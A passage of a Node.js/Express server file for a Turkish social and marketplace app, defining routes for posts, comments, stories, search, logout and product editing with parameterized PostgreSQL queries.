// Kullanım: POST /api/admin-fix-hls-to-mp4  (Postman ile 1 kez çalıştır, admin token ile)
app.post('/api/admin-fix-hls-to-mp4', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet('SELECT role FROM users WHERE id = $1', [req.user.id]);
        if (!user || user.role !== 'admin') return res.status(403).json({ error: 'Yetki yok' });

        const hlsPosts = await pool.query(
            `SELECT id, media FROM posts WHERE media LIKE '%/hls/%' AND media LIKE '%.m3u8'`
        );

        let fixed = 0, notFound = 0;
        for (const post of hlsPosts.rows) {
            const m = post.media.match(/\/hls\/([^/]+)\/master\.m3u8/);
            if (!m) continue;
            const videoId = m[1];
            const mp4Path = path.join(videosDir, `${videoId}.mp4`);

            if (fssync.existsSync(mp4Path)) {
                await dbRun(
                    `UPDATE posts SET media = $1, "updatedAt" = NOW() WHERE id = $2`,
                    [`/uploads/videos/${videoId}.mp4`, post.id]
                );
                fixed++;
            } else {
                const rawPath = path.join(videosDir, `${videoId}_raw.mp4`);
                if (fssync.existsSync(rawPath)) {
                    await dbRun(
                        `UPDATE posts SET media = $1, "updatedAt" = NOW() WHERE id = $2`,
                        [`/uploads/videos/${videoId}_raw.mp4`, post.id]
                    );
                    fixed++;
                } else {
                    notFound++;
                }
            }
        }

        res.json({
            success: true,
            total: hlsPosts.rows.length,
            fixed,
            notFound,
            message: `${fixed} gönderi MP4'e güncellendi. ${notFound} gönderi için MP4 bulunamadı.`
        });
    } catch (e) {
        console.error('[HLS-Fix] Hata:', e.message);
        res.status(500).json({ error: 'Migrasyon hatası' });
    }
});

// ─── YENİ ROTA 11: YORUM GÜNCELLE ──────────────────────────────────
app.put('/api/comments/:id', authenticateToken, async (req, res) => {
    try {
        const { content } = req.body;
        if (!content || !content.trim()) return res.status(400).json({ error: 'İçerik boş olamaz' });

        const comment = await dbGet('SELECT * FROM comments WHERE id = $1', [req.params.id]);
        if (!comment) return res.status(404).json({ error: 'Yorum bulunamadı' });
        if (comment.userId !== req.user.id) return res.status(403).json({ error: 'Yetkiniz yok' });

        await dbRun(
            'UPDATE comments SET content = $1, "updatedAt" = NOW() WHERE id = $2',
            [content.substring(0, 2000), req.params.id]
        );
        const updated = await dbGet('SELECT * FROM comments WHERE id = $1', [req.params.id]);
        res.json({ message: 'Yorum güncellendi', comment: updated });
    } catch (error) {
        console.error('Yorum güncelleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 12: POST GÜNCELLE ────────────────────────────────────
app.put('/api/posts/:id', authenticateToken, async (req, res) => {
    try {
        const post = await dbGet('SELECT * FROM posts WHERE id = $1', [req.params.id]);
        if (!post) return res.status(404).json({ error: 'Gönderi bulunamadı' });
        if (post.userId !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ error: 'Yetkiniz yok' });
        }

        const { content, allowComments, locationName } = req.body;
        const updates = [];
        const params  = [];
        let idx = 1;

        if (content !== undefined)        { updates.push(`content = $${idx++}`);        params.push(content.substring(0, 5000)); }
        if (allowComments !== undefined)  { updates.push(`"allowComments" = $${idx++}`); params.push(allowComments !== 'false' && allowComments !== false); }
        if (locationName !== undefined)   { updates.push(`"locationName" = $${idx++}`); params.push(locationName); }

        if (updates.length === 0) return res.status(400).json({ error: 'Güncellenecek alan yok' });

        updates.push(`"updatedAt" = NOW()`);
        params.push(req.params.id);
        await pool.query(`UPDATE posts SET ${updates.join(', ')} WHERE id = $${idx}`, params);

        const updated = await dbGet('SELECT * FROM posts WHERE id = $1', [req.params.id]);
        res.json({ message: 'Gönderi güncellendi', post: updated });
    } catch (error) {
        console.error('Post güncelleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 13: KULLANICININ KAYDETTİKLERİ (pagination) ─────────
app.get('/api/users/:userId/saved', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);

        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified",
                    TRUE AS "isSaved",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) AS "isLiked"
             FROM saves s
             JOIN posts p ON s."postId" = p.id
             JOIN users u ON p."userId" = u.id
             WHERE s."userId" = $2 AND p."isActive" = TRUE
             ORDER BY s."createdAt" DESC
             LIMIT $3 OFFSET $4`,
            [req.user.id, req.params.userId, parseInt(limit), offset]
        );
        res.json({ posts: posts.map(formatPost), page: parseInt(page) });
    } catch (error) {
        console.error('Kullanıcı kaydedilenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 14: SOHBET SİL ───────────────────────────────────────
app.delete('/api/messages/conversations/:partnerId', authenticateToken, async (req, res) => {
    try {
        const { partnerId } = req.params;
        await dbRun(
            `DELETE FROM messages
             WHERE ("senderId" = $1 AND "recipientId" = $2)
                OR ("senderId" = $2 AND "recipientId" = $1)`,
            [req.user.id, partnerId]
        );
        res.json({ message: 'Sohbet silindi' });
    } catch (error) {
        console.error('Sohbet silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 15: STORY GÖRÜNTÜLEYENLERİ GETİR ────────────────────
app.get('/api/stories/:id/viewers', authenticateToken, async (req, res) => {
    try {
        const story = await dbGet('SELECT "userId" FROM stories WHERE id = $1', [req.params.id]);
        if (!story) return res.status(404).json({ error: 'Hikaye bulunamadı' });
        if (story.userId !== req.user.id) return res.status(403).json({ error: 'Yetkiniz yok' });

        const viewers = await dbAll(
            `SELECT u.id, u.username, u.name, u."profilePic", u."isVerified", sv."viewedAt"
             FROM story_views sv
             JOIN users u ON sv."userId" = u.id
             WHERE sv."storyId" = $1
             ORDER BY sv."viewedAt" DESC`,
            [req.params.id]
        );
        res.json({ viewers, count: viewers.length });
    } catch (error) {
        console.error('Story görüntüleyenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 16: BÖLGESEL KULLANICILARI GETİR ─────────────────────
app.get('/api/users/nearby', authenticateToken, async (req, res) => {
    try {
        const { lat, lng, radius = 50 } = req.query;
        if (!lat || !lng) return res.status(400).json({ error: 'Konum gerekli (lat, lng)' });

        // Haversine yaklaşımı: 1 derece ≈ 111km
        const degRadius = parseFloat(radius) / 111;
        const users = await dbAll(
            `SELECT id, username, name, "profilePic", "isVerified", "userType", location
             FROM users
             WHERE "isActive" = TRUE AND id != $1
               AND location IS NOT NULL
             ORDER BY RANDOM()
             LIMIT 30`,
            [req.user.id]
        );
        res.json({ users, radius: parseInt(radius) });
    } catch (error) {
        console.error('Yakın kullanıcılar hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 17: BEĞENILEN GÖNDERILER ─────────────────────────────
app.get('/api/posts/liked', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);

        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified",
                    TRUE AS "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) AS "isSaved"
             FROM likes l
             JOIN posts p ON l."postId" = p.id
             JOIN users u ON p."userId" = u.id
             WHERE l."userId" = $1 AND p."isActive" = TRUE
             ORDER BY l."createdAt" DESC
             LIMIT $2 OFFSET $3`,
            [req.user.id, Math.min(Math.max(parseInt(limit)||20, 1), 200), Math.max(offset||0, 0)]
        );
        res.json({ posts, page: parseInt(page) });
    } catch (error) {
        console.error('Beğenilen gönderiler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 18: KULLANICI AKTİVİTE AKIŞI ─────────────────────────
app.get('/api/users/:id/activity', authenticateToken, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);

        // Son beğeniler + yorumlar + takip
        const activity = await dbAll(
            `(SELECT 'like' AS type, l."createdAt", p.id AS "targetId", p.content AS "targetContent", NULL AS extra
              FROM likes l JOIN posts p ON l."postId" = p.id
              WHERE l."userId" = $1)
             UNION ALL
             (SELECT 'comment' AS type, c."createdAt", c."postId" AS "targetId", c.content AS "targetContent", NULL AS extra
              FROM comments c WHERE c."userId" = $1)
             UNION ALL
             (SELECT 'follow' AS type, f."createdAt", f."followingId" AS "targetId", u.username AS "targetContent", NULL AS extra
              FROM follows f JOIN users u ON f."followingId" = u.id WHERE f."followerId" = $1)
             ORDER BY "createdAt" DESC
             LIMIT $2 OFFSET $3`,
            [req.params.id, parseInt(limit), offset]
        );
        res.json({ activity, page: parseInt(page) });
    } catch (error) {
        console.error('Aktivite akışı hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 19: TAKİP ÖNERİLERİ (GELİŞMİŞ) ──────────────────────
app.get('/api/users/recommendations', authenticateToken, async (req, res) => {
    try {
        // Takip ettiklerinin takip ettiklerini öner (ortak bağlantı mantığı)
        const recs = await dbAll(
            `SELECT DISTINCT u.id, u.username, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u."userType",
                    COUNT(DISTINCT f2.id) AS "mutualCount"
             FROM follows f1
             JOIN follows f2 ON f1."followingId" = f2."followerId"
             JOIN users u ON f2."followingId" = u.id
             WHERE f1."followerId" = $1
               AND f2."followingId" != $1
               AND u."isActive" = TRUE
               AND f2."followingId" NOT IN (SELECT "followingId" FROM follows WHERE "followerId" = $1)
               AND f2."followingId" NOT IN (SELECT "blockedId" FROM blocks WHERE "blockerId" = $1)
             GROUP BY u.id, u.username, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge", u."userType"
             ORDER BY "mutualCount" DESC
             LIMIT 15`,
            [req.user.id]
        );

        // Yeterli yoksa rastgele tamamla
        if (recs.length < 5) {
            const extra = await dbAll(
                `SELECT id, username, name, "profilePic", "isVerified", "hasFarmerBadge", "userType", 0 AS "mutualCount"
                 FROM users
                 WHERE "isActive" = TRUE AND id != $1
                   AND id NOT IN (SELECT "followingId" FROM follows WHERE "followerId" = $1)
                   AND id NOT IN (SELECT "blockedId" FROM blocks WHERE "blockerId" = $1)
                 ORDER BY "isVerified" DESC, RANDOM()
                 LIMIT $2`,
                [req.user.id, 15 - recs.length]
            );
            recs.push(...extra);
        }

        res.json({ recommendations: recs });
    } catch (error) {
        console.error('Tavsiye hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── YENİ ROTA 20: HASHTAG DETAY + POSTS ────────────────────────────
app.get('/api/hashtags/:tag', authenticateToken, async (req, res) => {
    try {
        const tag = req.params.tag.toLowerCase().replace('#', '');
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);

        const hashtag = await dbGet('SELECT * FROM hashtags WHERE tag = $1', [`#${tag}`]);
        if (!hashtag) return res.status(404).json({ error: 'Hashtag bulunamadı' });

        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) AS "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) AS "isSaved"
             FROM posts p
             JOIN users u ON p."userId" = u.id
             JOIN post_hashtags ph ON ph."postId" = p.id
             JOIN hashtags h ON ph."hashtagId" = h.id
             WHERE p."isActive" = TRUE AND h.tag = $2
             ORDER BY p."createdAt" DESC
             LIMIT $3 OFFSET $4`,
            [req.user.id, `#${tag}`, parseInt(limit), offset]
        );

        res.json({ hashtag, posts, page: parseInt(page) });
    } catch (error) {
        console.error('Hashtag detay hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 36. YORUM BEĞENİ ──────────────────────────────────────────────
app.post('/api/comments/:id/like', authenticateToken, likeLimiter, checkRestriction('like'), async (req, res) => {
    try {
        const commentId = req.params.id;
        const existing = await dbGet('SELECT id FROM comment_likes WHERE "commentId" = $1 AND "userId" = $2', [commentId, req.user.id]);

        if (existing) {
            await dbRun('DELETE FROM comment_likes WHERE id = $1', [existing.id]);
            await dbRun('UPDATE comments SET "likeCount" = GREATEST("likeCount" - 1, 0) WHERE id = $1', [commentId]);
            res.json({ liked: false });
        } else {
            await dbRun('INSERT INTO comment_likes (id, "commentId", "userId", "createdAt") VALUES ($1, $2, $3, NOW())', [uuidv4(), commentId, req.user.id]);
            await dbRun('UPDATE comments SET "likeCount" = "likeCount" + 1 WHERE id = $1', [commentId]);

            const comment = await dbGet('SELECT "userId" FROM comments WHERE id = $1', [commentId]);
            if (comment && comment.userId !== req.user.id) {
                createNotification(comment.userId, 'comment_like', `${req.user.username} yorumunuzu beğendi`, { commentId, userId: req.user.id });
            }
            res.json({ liked: true });
        }
    } catch (error) {
        console.error('Yorum beğeni hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 37. YORUM SİL ─────────────────────────────────────────────────
app.delete('/api/comments/:id', authenticateToken, async (req, res) => {
    try {
        const comment = await dbGet('SELECT * FROM comments WHERE id = $1', [req.params.id]);
        if (!comment) return res.status(404).json({ error: 'Yorum bulunamadı' });
        if (comment.userId !== req.user.id && req.user.role !== 'admin') {
            return res.status(403).json({ error: 'Yetkiniz yok' });
        }

        await dbRun('DELETE FROM comments WHERE id = $1', [req.params.id]);
        await dbRun('UPDATE posts SET "commentCount" = GREATEST("commentCount" - 1, 0) WHERE id = $1', [comment.postId]);

        res.json({ message: 'Yorum silindi' });
    } catch (error) {
        console.error('Yorum silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 38. STORY OLUŞTUR ─────────────────────────────────────────────
app.post('/api/stories', authenticateToken, storyLimiter, upload.single('media'), async (req, res) => {
    try {
        const { caption, text, textColor, textLayers, filter, linkUrl, hashtag, mentions, replyMode } = req.body;
        if (!req.file && !text) return res.status(400).json({ error: 'Medya veya metin gerekli' });

        let mediaUrl = null;
        let mediaType = 'text';

        if (req.file) {
            const ext = path.extname(req.file.originalname).toLowerCase();
            const isVideo = ['.mp4', '.webm', '.mov', '.avi', '.mkv'].includes(ext);
            mediaType = isVideo ? 'video' : 'image';

            if (isVideo) {
                const filename = `story_${uuidv4().replace(/-/g,"").slice(0,16)}${ext}`;
                const dest = path.join(videosDir, filename);
                await fs.rename(req.file.path, dest);
                mediaUrl = `/uploads/videos/${filename}`;
            } else {
                const filename = `story_${uuidv4().replace(/-/g,"").slice(0,16)}.webp`;
                const dest = path.join(postsDir, filename);
                // ✅ processImage: EXIF rotate fix + concurrency limiter
                await processImage(req.file.path, dest, { width: 1080, height: 1920, fit: 'inside', quality: 80, effort: 4 });
                await fs.unlink(req.file.path).catch(() => {});
                mediaUrl = `/uploads/posts/${filename}`;
            }
        }

        const storyId = uuidv4();

        // textLayers JSON validasyonu
        let parsedTextLayers = null;
        if (textLayers) {
            try { parsedTextLayers = JSON.stringify(JSON.parse(textLayers)); } catch(e) { parsedTextLayers = null; }
        }

        // mentions JSON validasyonu
        let parsedMentions = null;
        if (mentions) {
            try { parsedMentions = JSON.stringify(JSON.parse(mentions)); } catch(e) { parsedMentions = null; }
        }

        // ✅ Yeni alanları stories tablosuna ekle (eğer kolonlar yoksa ALTER TABLE ile yönet)
        await dbRun(
            `INSERT INTO stories (id, "userId", "mediaUrl", "mediaType", caption, text, "textColor", "textLayers",
                                  filter, "linkUrl", hashtag, mentions, "replyMode", "createdAt", "expiresAt")
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, NOW(), NOW() + INTERVAL '24 hours')
             ON CONFLICT DO NOTHING`,
            [storyId, req.user.id, mediaUrl || '', mediaType, caption || null,
             text || null, textColor || '#FFFFFF', parsedTextLayers,
             filter || null, linkUrl || null, hashtag || null,
             parsedMentions, replyMode || 'everyone']
        ).catch(async (err) => {
            // Kolonlar yoksa basit insert yap
            if (err.message && err.message.includes('column')) {
                await dbRun(
                    `INSERT INTO stories (id, "userId", "mediaUrl", "mediaType", caption, text, "textColor", "createdAt", "expiresAt")
                     VALUES ($1, $2, $3, $4, $5, $6, $7, NOW(), NOW() + INTERVAL '24 hours')`,
                    [storyId, req.user.id, mediaUrl || '', mediaType, caption || null, text || null, textColor || '#FFFFFF']
                );
            } else { throw err; }
        });

        res.status(201).json({ message: 'Hikaye oluşturuldu', storyId });
    } catch (error) {
        console.error('Story oluşturma hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 39. STORYLERİ GETİR ────────────────────────────────────────────
app.get('/api/stories', authenticateToken, async (req, res) => {
    try {
        const stories = await dbAll(
            `SELECT s.*, u.username, u.name, u."profilePic", u."isVerified",
                    EXISTS(SELECT 1 FROM story_views WHERE "storyId" = s.id AND "userId" = $1) as "isViewed",
                    EXISTS(SELECT 1 FROM story_likes WHERE "storyId" = s.id AND "userId" = $1) as "isLiked"
             FROM stories s
             JOIN users u ON s."userId" = u.id
             WHERE s."expiresAt" > NOW()
             ORDER BY s."createdAt" DESC`,
            [req.user.id]
        );

        const grouped = {};
        for (const story of stories) {
            if (!grouped[story.userId]) {
                grouped[story.userId] = {
                    userId: story.userId,
                    username: story.username,
                    name: story.name,
                    profilePic: story.profilePic,
                    isVerified: story.isVerified,
                    stories: []
                };
            }
            grouped[story.userId].stories.push(story);
        }

        res.json({ stories: Object.values(grouped) });
    } catch (error) {
        console.error('Stories hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 40. STORY GÖRÜNTÜLE ───────────────────────────────────────────
app.post('/api/stories/:id/view', authenticateToken, async (req, res) => {
    try {
        const storyId = req.params.id;
        const existing = await dbGet('SELECT id FROM story_views WHERE "storyId" = $1 AND "userId" = $2', [storyId, req.user.id]);

        if (!existing) {
            await dbRun('INSERT INTO story_views (id, "storyId", "userId", "viewedAt") VALUES ($1, $2, $3, NOW())', [uuidv4(), storyId, req.user.id]);
            await dbRun('UPDATE stories SET "viewCount" = "viewCount" + 1 WHERE id = $1', [storyId]);
        }

        res.json({ viewed: true });
    } catch (error) {
        console.error('Story view hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 41. STORY BEĞENİ ──────────────────────────────────────────────
app.post('/api/stories/:id/like', authenticateToken, async (req, res) => {
    try {
        const storyId = req.params.id;
        const existing = await dbGet('SELECT id FROM story_likes WHERE "storyId" = $1 AND "userId" = $2', [storyId, req.user.id]);

        if (existing) {
            await dbRun('DELETE FROM story_likes WHERE id = $1', [existing.id]);
            await dbRun('UPDATE stories SET "likeCount" = GREATEST("likeCount" - 1, 0) WHERE id = $1', [storyId]);
            res.json({ liked: false });
        } else {
            await dbRun('INSERT INTO story_likes (id, "storyId", "userId", "createdAt") VALUES ($1, $2, $3, NOW())', [uuidv4(), storyId, req.user.id]);
            await dbRun('UPDATE stories SET "likeCount" = "likeCount" + 1 WHERE id = $1', [storyId]);

            const story = await dbGet('SELECT "userId" FROM stories WHERE id = $1', [storyId]);
            if (story && story.userId !== req.user.id) {
                createNotification(story.userId, 'story_like', `${req.user.username} hikayenizi beğendi`, { storyId });
            }
            res.json({ liked: true });
        }
    } catch (error) {
        console.error('Story like hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 42. STORY SİL ─────────────────────────────────────────────────
app.delete('/api/stories/:id', authenticateToken, async (req, res) => {
    try {
        const story = await dbGet('SELECT "userId" FROM stories WHERE id = $1', [req.params.id]);
        if (!story) return res.status(404).json({ error: 'Hikaye bulunamadı' });
        if (story.userId !== req.user.id) return res.status(403).json({ error: 'Yetkiniz yok' });

        await dbRun('DELETE FROM stories WHERE id = $1', [req.params.id]);
        res.json({ message: 'Hikaye silindi' });
    } catch (error) {
        console.error('Story silme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── POST /api/stories/share-post — Gönderiyi hikayeye paylaş ──────
app.post('/api/stories/share-post', authenticateToken, async (req, res) => {
    try {
        const { postId } = req.body;
        if (!postId) return res.status(400).json({ error: 'postId gerekli' });

        const post = await dbGet(
            `SELECT p.*, u.name, u.username FROM posts p JOIN users u ON u.id=p."userId" WHERE p.id=$1 AND p."isActive"=TRUE`,
            [postId]
        );
        if (!post) return res.status(404).json({ error: 'Gönderi bulunamadı' });

        const storyId  = uuidv4();
        const postUrl  = `/share/post/${postId}`;
        const textContent = `${post.name || post.username}: ${(post.content || '').slice(0, 100)}`;

        await dbRun(
            `INSERT INTO stories (id, "userId", "mediaUrl", "mediaType", text, "linkUrl", "createdAt", "expiresAt")
             VALUES ($1, $2, $3, 'image', $4, $5, NOW(), NOW() + INTERVAL '24 hours')`,
            [storyId, req.user.id, post.mediaUrl || post.media || '', textContent, postUrl]
        ).catch(async () => {
            // Fallback for older schema
            await dbRun(
                `INSERT INTO stories (id, "userId", "mediaUrl", "mediaType", text, "createdAt", "expiresAt")
                 VALUES ($1, $2, $3, 'image', $4, NOW(), NOW() + INTERVAL '24 hours')`,
                [storyId, req.user.id, post.mediaUrl || post.media || '', textContent]
            );
        });

        res.json({ success: true, storyId, message: 'Hikayeye eklendi' });
    } catch (e) {
        console.error('[story share-post]', e.message);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});



// ─── 43. KULLANICI ARA (v2) ─────────────────────────────────────────
app.get('/api/search/users', authenticateToken, searchLimiter, async (req, res) => {
    try {
        const { q, page = 1, limit = 20 } = req.query;
        if (!q || q.trim().length < 2) return res.status(400).json({ error: 'En az 2 karakter gerekli' });

        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);
        const searchTerm = `%${q.toLowerCase().trim()}%`;

        const users = await dbAll(
            `SELECT id, username, name, "profilePic", "isVerified", "hasFarmerBadge", "userType",
                    EXISTS(SELECT 1 FROM follows WHERE "followerId" = $1 AND "followingId" = users.id) as "isFollowing"
             FROM users
             WHERE "isActive" = TRUE AND (LOWER(username) LIKE $2 OR LOWER(name) LIKE $2)
               AND id != $1
               AND id NOT IN (
                   SELECT "blockedId" FROM blocks WHERE "blockerId" = $1
                   UNION
                   SELECT "blockerId" FROM blocks WHERE "blockedId" = $1
               )
             ORDER BY "isVerified" DESC, "hasFarmerBadge" DESC, name ASC
             LIMIT $3 OFFSET $4`,
            [req.user.id, searchTerm, parseInt(limit), offset]
        );

        res.json({ users });
    } catch (error) {
        console.error('Kullanıcı arama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 44. POST ARA ───────────────────────────────────────────────────
app.get('/api/search/posts', authenticateToken, searchLimiter, async (req, res) => {
    try {
        const { q, page = 1, limit = 20 } = req.query;
        if (!q || q.trim().length < 2) return res.status(400).json({ error: 'En az 2 karakter gerekli' });

        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);
        const searchTerm = `%${q.toLowerCase().trim()}%`;

        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified", u."hasFarmerBadge",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved"
             FROM posts p
             JOIN users u ON p."userId" = u.id
             WHERE p."isActive" = TRUE AND LOWER(p.content) LIKE $2
               AND p."userId" NOT IN (
                   SELECT "blockedId" FROM blocks WHERE "blockerId" = $1
                   UNION
                   SELECT "blockerId" FROM blocks WHERE "blockedId" = $1
               )
             ORDER BY p."createdAt" DESC
             LIMIT $3 OFFSET $4`,
            [req.user.id, searchTerm, parseInt(limit), offset]
        );

        res.json({ posts: posts.map(formatPost) });
    } catch (error) {
        console.error('Post arama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 45. HASHTAG İLE ARA ────────────────────────────────────────────
app.get('/api/search/hashtag/:tag', authenticateToken, searchLimiter, async (req, res) => {
    try {
        const { page = 1, limit = 20 } = req.query;
        const offset = (Math.max(parseInt(page)||1, 1) - 1) * Math.min(Math.max(parseInt(limit)||20,1), 200);
        const tag = req.params.tag.toLowerCase().replace('#', '');

        const posts = await dbAll(
            `SELECT p.*, u.name, u."profilePic", u."isVerified",
                    EXISTS(SELECT 1 FROM likes WHERE "postId" = p.id AND "userId" = $1) as "isLiked",
                    EXISTS(SELECT 1 FROM saves WHERE "postId" = p.id AND "userId" = $1) as "isSaved"
             FROM posts p
             JOIN users u ON p."userId" = u.id
             JOIN post_hashtags ph ON ph."postId" = p.id
             JOIN hashtags h ON ph."hashtagId" = h.id
             WHERE p."isActive" = TRUE AND h.tag = $2
               AND p."userId" NOT IN (
                   SELECT "blockedId" FROM blocks WHERE "blockerId" = $1
                   UNION
                   SELECT "blockerId" FROM blocks WHERE "blockedId" = $1
               )
             ORDER BY p."createdAt" DESC
             LIMIT $3 OFFSET $4`,
            [req.user.id, tag, parseInt(limit), offset]
        );

        res.json({ posts: posts.map(formatPost) });
    } catch (error) {
        console.error('Hashtag arama hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 46. ÇIKIŞ YAP ─────────────────────────────────────────────────
app.post('/api/auth/logout', authenticateToken, async (req, res) => {
    try {
        // 🔒 Token'ı blacklist'e ekle — logout sonrası aynı token kullanılamaz (replay attack önlemi)
        blacklistToken(req._token);

        await dbRun('UPDATE users SET "isOnline" = FALSE, "lastSeen" = NOW() WHERE id = $1', [req.user.id]);
        await dbRun('UPDATE refresh_tokens SET "isActive" = FALSE WHERE "userId" = $1', [req.user.id]);
        // 🔒 HttpOnly cookie'leri temizle
        res.clearCookie('access_token',  { httpOnly: true, sameSite: 'strict', path: '/' });
        res.clearCookie('refresh_token', { httpOnly: true, sameSite: 'strict', path: '/api/auth/refresh' });
        res.json({ message: 'Çıkış yapıldı' });
    } catch (error) {
        console.error('Çıkış hatası');
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 47. POST GÖRÜNTÜLENME ─────────────────────────────────────────
// NOT: /api/posts/:id/view route'u aşağıda (satır ~7056) akıllı tekil-kullanıcı takibi ile tanımlandı.

// ─── 48. BEĞENENLERİ GETİR ─────────────────────────────────────────
app.get('/api/posts/:id/likes', authenticateToken, async (req, res) => {
    try {
        const users = await dbAll(
            `SELECT u.id, u.username, u.name, u."profilePic", u."isVerified",
                    EXISTS(SELECT 1 FROM follows WHERE "followerId" = $2 AND "followingId" = u.id) as "isFollowing"
             FROM likes l
             JOIN users u ON l."userId" = u.id
             WHERE l."postId" = $1
             ORDER BY l."createdAt" DESC`,
            [req.params.id, req.user.id]
        );
        res.json({ users });
    } catch (error) {
        console.error('Beğenenler hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 49. ÜRÜN GÜNCELLE ──────────────────────────────────────────────
app.put('/api/store/products/:id', authenticateToken, (req, res, next) => {
    upload.fields([{ name: 'images', maxCount: 5 }, { name: 'image', maxCount: 1 }])(req, res, (err) => {
        if (err) return res.status(400).json({ error: 'Dosya hatası: ' + err.message });
        if (req.files && !Array.isArray(req.files)) {
            req.files = [...(req.files['images'] || []), ...(req.files['image'] || [])];
        }
        next();
    });
}, async (req, res) => {
    try {
        const product = await dbGet('SELECT * FROM products WHERE id = $1', [req.params.id]);
        if (!product) return res.status(404).json({ error: 'Ürün bulunamadı' });
        if (product.sellerId !== req.user.id) return res.status(403).json({ error: 'Yetkiniz yok' });

        const { name, price, description, category, stock } = req.body;
        const updates = [];
        const params = [];
        let idx = 1;

        if (name)                 { updates.push(`name = $${idx++}`);           params.push(name.substring(0, 100)); }
        if (price)                { updates.push(`price = $${idx++}`);          params.push(parseFloat(price)); }
        if (description !== undefined) { updates.push(`description = $${idx++}`); params.push(description.substring(0, 1000)); }
        if (category)             { updates.push(`category = $${idx++}`);       params.push(category); }
        if (stock !== undefined)  { updates.push(`stock = $${idx++}`);          params.push(parseInt(stock)); }

        const files = Array.isArray(req.files) ? req.files : [];
        if (files.length > 0) {
            let images = [];
            for (let i = 0; i < files.length; i++) {
                const filename = `product_${uuidv4().replace(/-/g,"").slice(0,16)}_${i}.webp`;
                const outputPath = path.join(postsDir, filename);
                await processImage(files[i].path, outputPath, { width: 1080, height: 1080, fit: 'inside', quality: 78, effort: 4 });
                await fs.unlink(files[i].path).catch(() => {});
                images.push(`/uploads/posts/${filename}`);
            }
            updates.push(`image = $${idx++}`);   params.push(images[0]);
            updates.push(`images = $${idx++}::jsonb`); params.push(JSON.stringify(images));
        }

        if (updates.length === 0) return res.status(400).json({ error: 'Güncellenecek alan yok' });
        updates.push(`"updatedAt" = NOW()`);
        params.push(req.params.id);
        await pool.query(`UPDATE products SET ${updates.join(', ')} WHERE id = $${idx}`, params);

        const updated = await dbGet('SELECT * FROM products WHERE id = $1', [req.params.id]);
        res.json({ message: 'Ürün güncellendi', product: updated });
    } catch (error) {
        console.error('Ürün güncelleme hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası: ' + error.message });
    }
});

// ─── 50. ÜRÜN DETAYI ────────────────────────────────────────────────
app.get('/api/store/products/:id', authenticateToken, async (req, res) => {
    try {
        const product = await dbGet(
            `SELECT p.*, u.username as "sellerName", u."profilePic" as "sellerProfilePic", u.name as "sellerFullName", u."isVerified"
             FROM products p JOIN users u ON p."sellerId" = u.id
             WHERE p.id = $1`,
            [req.params.id]
        );
